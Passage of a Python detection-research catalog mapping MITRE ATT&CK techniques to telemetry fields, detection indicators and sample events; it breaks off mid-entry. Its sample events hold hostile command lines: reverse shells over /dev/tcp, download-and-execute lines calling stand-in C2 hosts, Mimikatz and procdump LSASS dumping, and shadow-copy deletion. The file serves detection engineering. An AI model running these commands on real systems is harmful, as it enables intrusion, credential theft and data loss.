"""
AHRAS Threat-Informed Implementation Catalog
---------------------------------------------
Comprehensive catalog of MITRE ATT&CK techniques across all 10 core tactics,
mapped to concrete, behaviorally distinct implementation vectors.

Replaces the "Heatmap Fallacy" by evaluating *concrete execution vectors*
rather than superficial technique tagging.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Dict, List, Optional


@dataclass
class TechniqueImplementation:
    """
    A concrete, behaviorally distinct vector of an ATT&CK technique.
    """
    technique_id: str
    technique_name: str
    tactic: str
    implementation_id: str
    vector_name: str
    description: str
    execution_modality: str  # host_cli, host_api, registry, network_flow, file_system, cloud_api, encrypted_session, memory_injection
    required_telemetry_fields: List[str]
    detection_indicators: List[str] = field(default_factory=list)
    sample_event: dict = field(default_factory=dict)
    mutations: List[dict] = field(default_factory=list)


@dataclass
class TechniqueDefinition:
    """
    Definition of an ATT&CK technique with its collection of implementation vectors.
    """
    technique_id: str
    technique_name: str
    tactic: str
    description: str
    implementations: List[TechniqueImplementation] = field(default_factory=list)

    def add_implementation(self, impl: TechniqueImplementation) -> None:
        self.implementations.append(impl)


class ImplementationCatalog:
    """
    In-memory registry of ATT&CK techniques and concrete implementations.
    """
    def __init__(self) -> None:
        self._techniques: Dict[str, TechniqueDefinition] = {}

    def register_technique(self, tech: TechniqueDefinition) -> None:
        self._techniques[tech.technique_id] = tech

    def get_technique(self, technique_id: str) -> Optional[TechniqueDefinition]:
        return self._techniques.get(technique_id)

    def get_all_techniques(self) -> List[TechniqueDefinition]:
        return list(self._techniques.values())

    def get_all_implementations(self) -> List[TechniqueImplementation]:
        impls = []
        for tech in self._techniques.values():
            impls.extend(tech.implementations)
        return impls

    def get_techniques_by_tactic(self, tactic: str) -> List[TechniqueDefinition]:
        return [t for t in self._techniques.values() if t.tactic.lower() == tactic.lower()]

    def get_tactics(self) -> List[str]:
        seen = []
        for t in self._techniques.values():
            if t.tactic not in seen:
                seen.append(t.tactic)
        return seen

    def count_techniques(self) -> int:
        return len(self._techniques)

    def count_implementations(self) -> int:
        return sum(len(t.implementations) for t in self._techniques.values())


def get_default_catalog() -> ImplementationCatalog:
    """
    Builds the standardized research catalog spanning 10 MITRE ATT&CK tactics,
    15 core techniques, and 45 behaviorally distinct implementations.
    """
    catalog = ImplementationCatalog()

    # =========================================================================
    # 1. TACTIC: EXECUTION
    # =========================================================================
    # T1059.001 - PowerShell
    t1059_001 = TechniqueDefinition(
        technique_id="T1059.001",
        technique_name="Command and Scripting Interpreter: PowerShell",
        tactic="Execution",
        description="Adversaries may abuse PowerShell commands and scripts for execution."
    )
    t1059_001.add_implementation(TechniqueImplementation(
        technique_id="T1059.001",
        technique_name="Command and Scripting Interpreter: PowerShell",
        tactic="Execution",
        implementation_id="T1059.001-IMPL-01",
        vector_name="powershell_encoded_command",
        description="PowerShell CLI execution using Base64 encoded script block (-EncodedCommand)",
        execution_modality="host_cli",
        required_telemetry_fields=["process.cmd", "process.name", "actor.user.name"],
        detection_indicators=["base64 -d", "base64 --decode", "powershell", "-enc"],
        sample_event={
            "ocsf_class": "process_activity",
            "process": {"name": "powershell.exe", "cmd": "powershell.exe -enc aWV4IChjZ2V0KQ==", "pid": 4120},
            "parent_process": {"name": "explorer.exe", "pid": 1100},
            "actor": {"user": {"name": "suyash"}},
        },
        mutations=[
            {"process": {"name": "powershell.exe", "cmd": "POWERSHELL -e aWV4IChjZ2V0KQ=="}},
            {"process": {"name": "powershell.exe", "cmd": "powershell.exe  -EncodedCommand  aWV4IChjZ2V0KQ=="}},
        ]
    ))
    t1059_001.add_implementation(TechniqueImplementation(
        technique_id="T1059.001",
        technique_name="Command and Scripting Interpreter: PowerShell",
        tactic="Execution",
        implementation_id="T1059.001-IMPL-02",
        vector_name="powershell_download_cradle",
        description="PowerShell WebClient download cradle invoked directly via CLI",
        execution_modality="host_cli",
        required_telemetry_fields=["process.cmd", "process.name"],
        detection_indicators=["wget http", "curl http", "downloadstring", "iex"],
        sample_event={
            "ocsf_class": "process_activity",
            "process": {"name": "powershell.exe", "cmd": "powershell.exe -c wget http://c2.xyz/p.ps1 | bash", "pid": 4124},
            "parent_process": {"name": "cmd.exe", "pid": 3200},
            "actor": {"user": {"name": "victim"}},
        },
        mutations=[
            {"process": {"name": "powershell.exe", "cmd": "powershell -c curl http://attacker.site/shell | bash"}},
        ]
    ))
    t1059_001.add_implementation(TechniqueImplementation(
        technique_id="T1059.001",
        technique_name="Command and Scripting Interpreter: PowerShell",
        tactic="Execution",
        implementation_id="T1059.001-IMPL-03",
        vector_name="powershell_csharp_runspace",
        description="In-memory PowerShell execution hosted directly within custom C# CLR without spawning powershell.exe",
        execution_modality="memory_injection",
        required_telemetry_fields=["etw.clr.assembly_load", "process.virtual_alloc", "process.thread_callstack"],
        detection_indicators=["System.Management.Automation.Runspaces", "assembly_load"],
        sample_event={
            "ocsf_class": "process_activity",
            "process": {"name": "svchost_custom.exe", "cmd": "svchost_custom.exe", "pid": 5890},
            "actor": {"user": {"name": "system"}},
        },
        mutations=[]
    ))
    catalog.register_technique(t1059_001)

    # T1059.004 - Unix Shell
    t1059_004 = TechniqueDefinition(
        technique_id="T1059.004",
        technique_name="Command and Scripting Interpreter: Unix Shell",
        tactic="Execution",
        description="Adversaries may abuse Unix shells to execute commands and malicious payloads."
    )
    t1059_004.add_implementation(TechniqueImplementation(
        technique_id="T1059.004",
        technique_name="Command and Scripting Interpreter: Unix Shell",
        tactic="Execution",
        implementation_id="T1059.004-IMPL-01",
        vector_name="bash_dev_tcp_reverse_shell",
        description="Direct bash interactive reverse shell redirection via /dev/tcp socket",
        execution_modality="host_cli",
        required_telemetry_fields=["process.cmd", "process.name", "actor.user.name"],
        detection_indicators=["/dev/tcp", "exec 5<>", "bash"],
        sample_event={
            "ocsf_class": "process_activity",
            "process": {"name": "bash", "cmd": "bash -i >& /dev/tcp/10.0.0.99/4444 0>&1", "pid": 8812},
            "parent_process": {"name": "apache2", "pid": 8011},
            "actor": {"user": {"name": "www-data"}},
        },
        mutations=[
            {"process": {"name": "bash", "cmd": "sh -c 'bash -i >& /dev/tcp/10.0.0.99/4444 0>&1'"}},
            {"process": {"name": "bash", "cmd": "exec 5<>/dev/tcp/10.0.0.99/4444; cat <&5 | while read line; do $line 2>&5 >&5; done"}},
        ]
    ))
    t1059_004.add_implementation(TechniqueImplementation(
        technique_id="T1059.004",
        technique_name="Command and Scripting Interpreter: Unix Shell",
        tactic="Execution",
        implementation_id="T1059.004-IMPL-02",
        vector_name="base64_pipe_to_shell",
        description="Base64 encoded execution payload piped directly to shell binary",
        execution_modality="host_cli",
        required_telemetry_fields=["process.cmd", "process.name"],
        detection_indicators=["base64 -d", "base64 --decode", " | bash", " | sh"],
        sample_event={
            "ocsf_class": "process_activity",
            "process": {"name": "sh", "cmd": "echo Y3VybCBodHRwOi8vYXR0YWNrZXIuY29tL3NoIHwgYmFzaA== | base64 -d | bash", "pid": 8940},
            "parent_process": {"name": "cron", "pid": 600},
            "actor": {"user": {"name": "root"}},
        },
        mutations=[
            {"process": {"name": "bash", "cmd": "echo payload | base64 --decode | bash"}},
        ]
    ))
    t1059_004.add_implementation(TechniqueImplementation(
        technique_id="T1059.004",
        technique_name="Command and Scripting Interpreter: Unix Shell",
        tactic="Execution",
        implementation_id="T1059.004-IMPL-03",
        vector_name="ephemeral_namespace_subshell",
        description="Shell execution within ephemeral unprivileged container namespace with unmounted procfs",
        execution_modality="memory_injection",
        required_telemetry_fields=["kernel.ebpf.sched_process_exec", "cgroup.namespace_id"],
        detection_indicators=["nsenter", "unshare", "isolated_cgroup"],
        sample_event={
            "ocsf_class": "process_activity",
            "process": {"name": "unshare", "cmd": "unshare -m -p /bin/sh", "pid": 9100},
        },
        mutations=[]
    ))
    catalog.register_technique(t1059_004)

    # =========================================================================
    # 2. TACTIC: PERSISTENCE
    # =========================================================================
    # T1053.005 - Scheduled Task
    t1053_005 = TechniqueDefinition(
        technique_id="T1053.005",
        technique_name="Scheduled Task/Job: Scheduled Task",
        tactic="Persistence",
        description="Adversaries may abuse task scheduling functionality to facilitate initial or recurring malicious code execution."
    )
    t1053_005.add_implementation(TechniqueImplementation(
        technique_id="T1053.005",
        technique_name="Scheduled Task/Job: Scheduled Task",
        tactic="Persistence",
        implementation_id="T1053.005-IMPL-01",
        vector_name="schtasks_cli_creation",
        description="Scheduled task creation via schtasks.exe command-line execution",
        execution_modality="host_cli",
        required_telemetry_fields=["process.cmd", "process.name", "actor.user.name"],
        detection_indicators=["schtasks", "/create", "/tn"],
        sample_event={
            "ocsf_class": "process_activity",
            "process": {"name": "schtasks.exe", "cmd": "schtasks.exe /create /tn MalUpdate /tr C:\\evil.exe /sc onlogon", "pid": 3312},
            "parent_process": {"name": "cmd.exe", "pid": 2040},
            "actor": {"user": {"name": "Administrator"}},
        },
        mutations=[
            {"process": {"name": "schtasks.exe", "cmd": "SCHTASKS.EXE /CREATE /TN UpdateTask /TR calc.exe /SC DAILY"}},
        ]
    ))
    t1053_005.add_implementation(TechniqueImplementation(
        technique_id="T1053.005",
        technique_name="Scheduled Task/Job: Scheduled Task",
        tactic="Persistence",
        implementation_id="T1053.005-IMPL-02",
        vector_name="direct_task_xml_drop",
        description="Direct XML task configuration dropped into %SystemRoot%\\System32\\Tasks directory bypassing API",
        execution_modality="file_system",
        required_telemetry_fields=["file.path", "file.action", "file.entropy"],
        detection_indicators=["System32\\Tasks", ".xml", "TaskCache"],
        sample_event={
            "ocsf_class": "file_activity",
            "file": {"path": "C:\\Windows\\System32\\Tasks\\BackdoorTask", "action": "create", "entropy": 4.1},
            "actor": {"user": {"name": "system"}},
        },
        mutations=[]
    ))
    t1053_005.add_implementation(TechniqueImplementation(
        technique_id="T1053.005",
        technique_name="Scheduled Task/Job: Scheduled Task",
        tactic="Persistence",
        implementation_id="T1053.005-IMPL-03",
        vector_name="taskcache_registry_persistence",
        description="Direct registry key injection into HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree",
        execution_modality="registry",
        required_telemetry_fields=["registry.key_path", "registry.value_name", "registry.action"],
        detection_indicators=["TaskCache\\Tree", "Schedule\\TaskCache"],
        sample_event={
            "ocsf_class": "registry_activity",
            "registry": {"key_path": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\UpdateCheck"},
        },
        mutations=[]
    ))
    catalog.register_technique(t1053_005)

    # T1543.002 - Systemd Service
    t1543_002 = TechniqueDefinition(
        technique_id="T1543.002",
        technique_name="Create or Modify System Process: Systemd Service",
        tactic="Persistence",
        description="Adversaries may create or modify systemd services to establish persistence."
    )
    t1543_002.add_implementation(TechniqueImplementation(
        technique_id="T1543.002",
        technique_name="Create or Modify System Process: Systemd Service",
        tactic="Persistence",
        implementation_id="T1543.002-IMPL-01",
        vector_name="systemctl_enable_service",
        description="Registering and enabling malicious systemd service via systemctl CLI",
        execution_modality="host_cli",
        required_telemetry_fields=["process.cmd", "process.name", "actor.user.name"],
        detection_indicators=["systemctl enable", "systemctl start"],
        sample_event={
            "ocsf_class": "process_activity",
            "process": {"name": "systemctl", "cmd": "systemctl enable /tmp/malicious.service", "pid": 7110},
            "actor": {"user": {"name": "root"}},
        },
        mutations=[]
    ))
    t1543_002.add_implementation(TechniqueImplementation(
        technique_id="T1543.002",
        technique_name="Create or Modify System Process: Systemd Service",
        tactic="Persistence",
        implementation_id="T1543.002-IMPL-02",
        vector_name="direct_unit_file_drop",
        description="Direct file drop of unit file into /etc/systemd/system/ directory",
        execution_modality="file_system",
        required_telemetry_fields=["file.path", "file.action", "actor.user.name"],
        detection_indicators=["/etc/systemd/system/", ".service"],
        sample_event={
            "ocsf_class": "file_activity",
            "file": {"path": "/etc/systemd/system/persist.service", "action": "create"},
            "actor": {"user": {"name": "root"}},
        },
        mutations=[]
    ))
    catalog.register_technique(t1543_002)

    # =========================================================================
    # 3. TACTIC: PRIVILEGE ESCALATION
    # =========================================================================
    # T1548.001 - Setuid and Setgid
    t1548_001 = TechniqueDefinition(
        technique_id="T1548.001",
        technique_name="Abuse Elevation Control Mechanism: Setuid and Setgid",
        tactic="Privilege Escalation",
        description="Adversaries may abuse setuid or setgid permissions on binaries to elevate privileges."
    )
    t1548_001.add_implementation(TechniqueImplementation(
        technique_id="T1548.001",
        technique_name="Abuse Elevation Control Mechanism: Setuid and Setgid",
        tactic="Privilege Escalation",
        implementation_id="T1548.001-IMPL-01",
        vector_name="root_child_spawn_from_suid",
        description="Root child shell spawned from non-privileged parent via vulnerable SUID binary",
        execution_modality="host_cli",
        required_telemetry_fields=["process.cmd", "process.name", "actor.user.uid", "parent_process.uid"],
        detection_indicators=["root child spawn", "uid=0"],
        sample_event={
            "ocsf_class": "process_activity",
            "process": {"name": "sh", "cmd": "/bin/sh", "pid": 9940},
            "parent_process": {"name": "pkexec", "pid": 9939, "uid": 1000},
            "actor": {"user": {"name": "root", "uid": 0}},
        },
        mutations=[
            {"process": {"name": "bash", "cmd": "bash -p"}, "actor": {"user": {"name": "root", "uid": 0}}},
        ]
    ))
    t1548_001.add_implementation(TechniqueImplementation(
        technique_id="T1548.001",
        technique_name="Abuse Elevation Control Mechanism: Setuid and Setgid",
        tactic="Privilege Escalation",
        implementation_id="T1548.001-IMPL-02",
        vector_name="chmod_suid_bit_injection",
        description="Setting SUID bit on binary using chmod u+s CLI command",
        execution_modality="host_cli",
        required_telemetry_fields=["process.cmd", "process.name"],
        detection_indicators=["chmod +s", "chmod 4755", "chmod u+s"],
        sample_event={
            "ocsf_class": "process_activity",
            "process": {"name": "chmod", "cmd": "chmod 4755 /tmp/backdoor", "pid": 4821},
            "actor": {"user": {"name": "root"}},
        },
        mutations=[]
    ))
    catalog.register_technique(t1548_001)

    # T1078.004 - Cloud Accounts
    t1078_004 = TechniqueDefinition(
        technique_id="T1078.004",
        technique_name="Valid Accounts: Cloud Accounts",
        tactic="Privilege Escalation",
        description="Adversaries may obtain and abuse credentials of cloud accounts for access and privilege escalation."
    )
    t1078_004.add_implementation(TechniqueImplementation(
        technique_id="T1078.004",
        technique_name="Valid Accounts: Cloud Accounts",
        tactic="Privilege Escalation",
        implementation_id="T1078.004-IMPL-01",
        vector_name="external_unknown_cloud_actor",
        description="External unauthenticated or unknown user accessing cloud management API",
        execution_modality="cloud_api",
        required_telemetry_fields=["api.operation", "actor.user.name", "src_endpoint.ip"],
        detection_indicators=["unknown user", "external actor"],
        sample_event={
            "ocsf_class": "cloud_api",
            "api": {"operation": "ec2:DescribeInstances"},
            "actor": {"user": {"name": "unknown_actor"}},
            "src_endpoint": {"ip": "198.51.100.22"},
            "enrichment": {"is_private": False},
        },
        mutations=[
            {"actor": {"user": {"name": "unknown_dev"}}, "src_endpoint": {"ip": "203.0.113.88"}},
        ]
    ))
    t1078_004.add_implementation(TechniqueImplementation(
        technique_id="T1078.004",
        technique_name="Valid Accounts: Cloud Accounts",
        tactic="Privilege Escalation",
        implementation_id="T1078.004-IMPL-02",
        vector_name="cloud_high_privilege_iam_grant",
        description="Granting administrator or high-privilege IAM policies to cloud identity",
        execution_modality="cloud_api",
        required_telemetry_fields=["api.operation", "actor.user.name"],
        detection_indicators=["iam:AttachUserPolicy", "iam:PutUserPolicy", "iam:CreateAccessKey"],
        sample_event={
            "ocsf_class": "cloud_api",
            "api": {"operation": "iam:AttachUserPolicy"},
            "actor": {"user": {"name": "admin_service"}},
            "src_endpoint": {"ip": "10.0.1.5"},
        },
        mutations=[]
    ))
    catalog.register_technique(t1078_004)

    # =========================================================================
    # 4. TACTIC: DEFENSE EVASION
    # =========================================================================
    # T1070.004 - File Deletion / Shadow Copy
    t1070_004 = TechniqueDefinition(
        technique_id="T1070.004",
        technique_name="Indicator Removal: File Deletion / Shadow Copy",
        tactic="Defense Evasion",
        description="Adversaries may delete files and shadow copies to prevent recovery and conceal malicious activity."
    )
    t1070_004.add_implementation(TechniqueImplementation(
        technique_id="T1070.004",
        technique_name="Indicator Removal: File Deletion / Shadow Copy",
        tactic="Defense Evasion",
        implementation_id="T1070.004-IMPL-01",
        vector_name="vssadmin_shadow_copy_deletion",
        description="Volume shadow copy deletion via vssadmin.exe delete shadows CLI command",
        execution_modality="host_cli",
        required_telemetry_fields=["process.cmd", "process.name", "actor.user.name"],
        detection_indicators=["vssadmin", "delete shadows", "/quiet"],
        sample_event={
            "ocsf_class": "process_activity",
            "process": {"name": "vssadmin.exe", "cmd": "vssadmin.exe delete shadows /all /quiet", "pid": 4810},
            "actor": {"user": {"name": "Administrator"}},
        },
        mutations=[
            {"process": {"name": "vssadmin.exe", "cmd": "vssadmin delete shadows /for=c: /quiet"}},
        ]
    ))
    t1070_004.add_implementation(TechniqueImplementation(
        technique_id="T1070.004",
        technique_name="Indicator Removal: File Deletion / Shadow Copy",
        tactic="Defense Evasion",
        implementation_id="T1070.004-IMPL-02",
        vector_name="shadow_copy_file_target_removal",
        description="Direct deletion of Volume Shadow Copy storage files from System Volume Information",
        execution_modality="file_system",
        required_telemetry_fields=["file.path", "file.action"],
        detection_indicators=["vssadmin", "shadow", "System Volume Information"],
        sample_event={
            "ocsf_class": "file_activity",
            "file": {"path": "C:\\System Volume Information\\{3808876b-c176-4e48-b0ae-04046e6cc752}", "action": "delete"},
            "process": {"cmd": "vssadmin delete shadows"},
        },
        mutations=[]
    ))
    t1070_004.add_implementation(TechniqueImplementation(
        technique_id="T1070.004",
        technique_name="Indicator Removal: File Deletion / Shadow Copy",
        tactic="Defense Evasion",
        implementation_id="T1070.004-IMPL-03",
        vector_name="raw_vss_kernel_io_destruction",
        description="Raw IOCTL device control manipulation to destroy shadow storage without file API events",
        execution_modality="memory_injection",
        required_telemetry_fields=["kernel.driver.ioctl_code", "disk.raw_write"],
        detection_indicators=["IOCTL_VOLSNAP", "raw_sector_overwrite"],
        sample_event={
            "ocsf_class": "driver_activity",
            "driver": {"ioctl": 0x530024},
        },
        mutations=[]
    ))
    catalog.register_technique(t1070_004)

    # T1027 - Obfuscated Files or Information
    t1027 = TechniqueDefinition(
        technique_id="T1027",
        technique_name="Obfuscated Files or Information",
        tactic="Defense Evasion",
        description="Adversaries may attempt to make an executable or file difficult to discover or analyze."
    )
    t1027.add_implementation(TechniqueImplementation(
        technique_id="T1027",
        technique_name="Obfuscated Files or Information",
        tactic="Defense Evasion",
        implementation_id="T1027-IMPL-01",
        vector_name="base64_encoded_cli_payload",
        description="Base64 obfuscated payload passed as command-line argument",
        execution_modality="host_cli",
        required_telemetry_fields=["process.cmd", "process.name"],
        detection_indicators=["base64 -d", "base64 --decode", "python -c"],
        sample_event={
            "ocsf_class": "process_activity",
            "process": {"name": "python", "cmd": "python -c 'import base64; exec(base64.b64decode(...))'", "pid": 6120},
        },
        mutations=[
            {"process": {"name": "python3", "cmd": "python3 -c 'import base64; eval(...)'"}},
        ]
    ))
    t1027.add_implementation(TechniqueImplementation(
        technique_id="T1027",
        technique_name="Obfuscated Files or Information",
        tactic="Defense Evasion",
        implementation_id="T1027-IMPL-02",
        vector_name="high_shannon_entropy_file_write",
        description="Writing highly encrypted or packed file payload with Shannon entropy > 7.2",
        execution_modality="file_system",
        required_telemetry_fields=["file.path", "file.entropy", "file.action"],
        detection_indicators=["entropy >= 7.2"],
        sample_event={
            "ocsf_class": "file_activity",
            "file": {"path": "/var/tmp/payload.bin", "entropy": 7.85, "action": "write"},
        },
        mutations=[
            {"file": {"path": "/tmp/libsystem.so", "entropy": 7.92, "action": "write"}},
        ]
    ))
    catalog.register_technique(t1027)

    # =========================================================================
    # 5. TACTIC: CREDENTIAL ACCESS
    # =========================================================================
    # T1003.001 - LSASS Memory
    t1003_001 = TechniqueDefinition(
        technique_id="T1003.001",
        technique_name="OS Credential Dumping: LSASS Memory",
        tactic="Credential Access",
        description="Adversaries may attempt to access credential material stored in the process memory of LSASS."
    )
    t1003_001.add_implementation(TechniqueImplementation(
        technique_id="T1003.001",
        technique_name="OS Credential Dumping: LSASS Memory",
        tactic="Credential Access",
        implementation_id="T1003.001-IMPL-01",
        vector_name="mimikatz_cli_execution",
        description="Direct invocation of Mimikatz binary or sekurlsa commands from command line",
        execution_modality="host_cli",
        required_telemetry_fields=["process.cmd", "process.name", "actor.user.name"],
        detection_indicators=["mimikatz", "sekurlsa", "lsass"],
        sample_event={
            "ocsf_class": "process_activity",
            "process": {"name": "mimikatz.exe", "cmd": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit", "pid": 4321},
            "actor": {"user": {"name": "Administrator"}},
        },
        mutations=[
            {"process": {"name": "mimi.exe", "cmd": "mimi.exe sekurlsa::logonpasswords"}},
        ]
    ))
    t1003_001.add_implementation(TechniqueImplementation(
        technique_id="T1003.001",
        technique_name="OS Credential Dumping: LSASS Memory",
        tactic="Credential Access",
        implementation_id="T1003.001-IMPL-02",
        vector_name="procdump_lsass_dump",
        description="Using Sysinternals procdump.exe to write LSASS process minidump to disk",
        execution_modality="host_cli",
        required_telemetry_fields=["process.cmd", "process.name"],
        detection_indicators=["procdump", "lsass", "/ma lsass"],
        sample_event={
            "ocsf_class": "process_activity",
            "process": {"name": "procdump.exe", "cmd": "procdump.exe -ma lsass.exe lsass.dmp", "pid": 4410},
        },
        mutations=[
            {"process": {"name": "procdump64.exe", "cmd": "procdump64.exe -accepteula -ma lsass.exe out.dmp"}},
        ]
    ))
    t1003_001.add_implementation(TechniqueImplementation(
        technique_id="T1003.001",
        technique_name="OS Credential Dumping: LSASS Memory",
        tactic="Credential Access",
        implementation_id="T1003.001-IMPL-03",
        vector_name="lsass_direct_kernel_handle_duplication",
        description="Duplicating existing SYSTEM handle to lsass.exe via custom kernel driver, bypassing OpenProcess API",
        execution_modality="memory_injection",
        required_telemetry_fields=["kernel.object_manager.handle_duplicate", "process.target_handle"],
        detection_indicators=["ObDuplicateObject", "lsass_handle_steal"],
        sample_event={
            "ocsf_class": "driver_activity",
            "target_process": "lsass.exe",
        },
        mutations=[]
    ))
    catalog.register_technique(t1003_001)

    # T1110.001 - Password Guessing
    t1110_001 = TechniqueDefinition(
        technique_id="T1110.001",
        technique_name="Brute Force: Password Guessing",
        tactic="Credential Access",
        description="Adversaries may systematically guess passwords against authentication services."
    )
    t1110_001.add_implementation(TechniqueImplementation(
        technique_id="T1110.001",
        technique_name="Brute Force: Password Guessing",
        tactic="Credential Access",
        implementation_id="T1110.001-IMPL-01",
        vector_name="ssh_volumetric_brute_force",
        description="Volumetric SSH brute-force attack characterized by high packet count on port 22",
        execution_modality="network_flow",
        required_telemetry_fields=["dst_endpoint.port", "traffic.packets", "src_endpoint.ip"],
        detection_indicators=["dst_port=22", "packets >= 100"],
        sample_event={
            "ocsf_class": "network_activity",
            "dst_endpoint": {"port": 22},
            "src_endpoint": {"ip": "192.168.1.105"},
            "traffic": {"packets": 150, "bytes": 12500},
        },
        mutations=[
            {"dst_endpoint": {"port": 22}, "traffic": {"packets": 250, "bytes": 22000}},
            {"dst_endpoint": {"port": 22}, "traffic": {"packets": 500, "bytes": 45000}},
        ]
    ))
    t1110_001.add_implementation(TechniqueImplementation(
        technique_id="T1110.001",
        technique_name="Brute Force: Password Guessing",
        tactic="Credential Access",
        implementation_id="T1110.001-IMPL-02",
        vector_name="ssh_low_and_slow_password_spray",
        description="Distributed low-and-slow SSH credential spray staying under volumetric packet thresholds",
        execution_modality="network_flow",
        required_telemetry_fields=["dst_endpoint.port", "auth.failure_count", "src_endpoint.ip"],
        detection_indicators=["distributed_auth_failure", "multi_source_spray"],
        sample_event={
            "ocsf_class": "network_activity",
            "dst_endpoint": {"port": 22},
            "src_endpoint": {"ip": "10.0.5.21"},
            "traffic": {"packets": 12, "bytes": 1200},
        },
        mutations=[]
    ))
    t1110_001.add_implementation(TechniqueImplementation(
        technique_id="T1110.001",
        technique_name="Brute Force: Password Guessing",
        tactic="Credential Access",
        implementation_id="T1110.001-IMPL-03",
        vector_name="ftp_cleartext_brute_force",
        description="Repeated FTP USER/PASS credential guessing attempts on port 21",
        execution_modality="network_flow",
        required_telemetry_fields=["dst_endpoint.port", "traffic.packets", "src_endpoint.ip"],
        detection_indicators=["dst_port=21", "ftp_login_failure"],
        sample_event={
            "ocsf_class": "network_activity",
            "dst_endpoint": {"port": 21},
            "src_endpoint": {"ip": "192.168.1.180"},
            "traffic": {"packets": 80, "bytes": 6400},
        },
        mutations=[]
    ))
    catalog.register_technique(t1110_001)

    # =========================================================================
    # 6. TACTIC: DISCOVERY
    # =========================================================================
    # T1046 - Network Service Discovery
    t1046 = TechniqueDefinition(
        technique_id="T1046",
        technique_name="Network Service Discovery",
        tactic="Discovery",
        description="Adversaries may attempt to get a listing of services running on remote hosts."
    )
    t1046.add_implementation(TechniqueImplementation(
        technique_id="T1046",
        technique_name="Network Service Discovery",
        tactic="Discovery",
        implementation_id="T1046-IMPL-01",
        vector_name="syn_port_scan_sweep",
        description="Rapid TCP SYN scan across multiple unique destination ports without completed handshakes",
        execution_modality="network_flow",
        required_telemetry_fields=["unique_dst_ports", "tcp_flags", "traffic.packets"],
        detection_indicators=["unique_dst_ports >= 20", "SYN in flags"],
        sample_event={
            "ocsf_class": "network_activity",
            "unique_dst_ports": 35,
            "tcp_flags": ["SYN"],
            "traffic": {"packets": 70, "bytes": 2800},
            "src_endpoint": {"ip": "172.16.0.4"},
        },
        mutations=[
            {"unique_dst_ports": 50, "tcp_flags": ["SYN"], "traffic": {"packets": 100}},
            {"unique_dst_ports": 25, "tcp_flags": ["SYN"], "traffic": {"packets": 40}},
        ]
    ))
    t1046.add_implementation(TechniqueImplementation(
        technique_id="T1046",
        technique_name="Network Service Discovery",
        tactic="Discovery",
        implementation_id="T1046-IMPL-02",
        vector_name="slow_distributed_port_scan",
        description="Decoy-interleaved slow port scan probing 1 port per hour across target range",
        execution_modality="network_flow",
        required_telemetry_fields=["unique_dst_ports", "time_window_hours", "src_endpoint.ip"],
        detection_indicators=["long_term_scan_correlation"],
        sample_event={
            "ocsf_class": "network_activity",
            "unique_dst_ports": 1,
            "tcp_flags": ["SYN"],
            "traffic": {"packets": 2},
        },
        mutations=[]
    ))
    catalog.register_technique(t1046)

    # T1526 - Cloud Service Discovery
    t1526 = TechniqueDefinition(
        technique_id="T1526",
        technique_name="Cloud Service Discovery",
        tactic="Discovery",
        description="Adversaries may attempt to discover active cloud services and permissions."
    )
    t1526.add_implementation(TechniqueImplementation(
        technique_id="T1526",
        technique_name="Cloud Service Discovery",
        tactic="Discovery",
        implementation_id="T1526-IMPL-01",
        vector_name="cloud_api_access_denied_enumeration",
        description="Rapid cloud enumeration queries triggering AccessDenied / Unauthorized errors",
        execution_modality="cloud_api",
        required_telemetry_fields=["api.operation", "response.error", "actor.user.name"],
        detection_indicators=["accessdenied", "unauthorizedoperation", "T1526"],
        sample_event={
            "ocsf_class": "cloud_api",
            "api": {"operation": "s3:ListAllMyBuckets"},
            "response": {"error": "AccessDenied: User not authorized"},
            "actor": {"user": {"name": "temp-user"}},
        },
        mutations=[
            {"response": {"error": "UnauthorizedOperation: Access not permitted"}},
        ]
    ))
    t1526.add_implementation(TechniqueImplementation(
        technique_id="T1526",
        technique_name="Cloud Service Discovery",
        tactic="Discovery",
        implementation_id="T1526-IMPL-02",
        vector_name="low_rate_authorized_cloud_read_enumeration",
        description="Authorized discovery queries across resource groups (Describe*, Get*) under normal error rates",
        execution_modality="cloud_api",
        required_telemetry_fields=["api.operation", "cloud.service", "actor.user.name"],
        detection_indicators=["describe_instances", "list_roles"],
        sample_event={
            "ocsf_class": "cloud_api",
            "api": {"operation": "ec2:DescribeInstances"},
            "response": {"error": None},
            "actor": {"user": {"name": "app-runner"}},
        },
        mutations=[]
    ))
    catalog.register_technique(t1526)

    # =========================================================================
    # 7. TACTIC: LATERAL MOVEMENT
    # =========================================================================
    # T1021.002 - SMB/Windows Admin Shares
    t1021_002 = TechniqueDefinition(
        technique_id="T1021.002",
        technique_name="Remote Services: SMB/Windows Admin Shares",
        tactic="Lateral Movement",
        description="Adversaries may use SMB to transfer payloads and remotely execute code on target endpoints."
    )
    t1021_002.add_implementation(TechniqueImplementation(
        technique_id="T1021.002",
        technique_name="Remote Services: SMB/Windows Admin Shares",
        tactic="Lateral Movement",
        implementation_id="T1021.002-IMPL-01",
        vector_name="smb_port_445_high_volume_transfer",
        description="High-volume binary or payload transfer targeting port 445 (SMB) across internal subnets",
        execution_modality="network_flow",
        required_telemetry_fields=["dst_endpoint.port", "traffic.bytes", "src_endpoint.ip"],
        detection_indicators=["dst_port=445", "bytes >= 50000"],
        sample_event={
            "ocsf_class": "network_activity",
            "dst_endpoint": {"port": 445, "ip": "10.0.0.12"},
            "src_endpoint": {"ip": "10.0.0.5"},
            "traffic": {"bytes": 120_000, "packets": 95},
        },
        mutations=[
            {"dst_endpoint": {"port": 445}, "traffic": {"bytes": 65000, "packets": 60}},
            {"dst_endpoint": {"port": 445}, "traffic": {"bytes": 250000, "packets": 190}},
        ]
    ))
    t1021_002.add_implementation(TechniqueImplementation(
        technique_id="T1021.002",
        technique_name="Remote Services: SMB/Windows Admin Shares",
        tactic="Lateral Movement",
        implementation_id="T1021.002-IMPL-02",
        vector_name="psexec_named_pipe_creation",
        description="PsExec remote service installation creating named pipes (\\pipe\\psexecsvc)",
        execution_modality="file_system",
        required_telemetry_fields=["file.path", "file.action", "pipe.name"],
        detection_indicators=["\\pipe\\psexecsvc", "IPC$"],
        sample_event={
            "ocsf_class": "file_activity",
            "file": {"path": "\\\\Target\\IPC$\\psexecsvc", "action": "open"},
        },
        mutations=[]
    ))
    catalog.register_technique(t1021_002)

    # T1021.001 - Remote Desktop Protocol
    t1021_001 = TechniqueDefinition(
        technique_id="T1021.001",
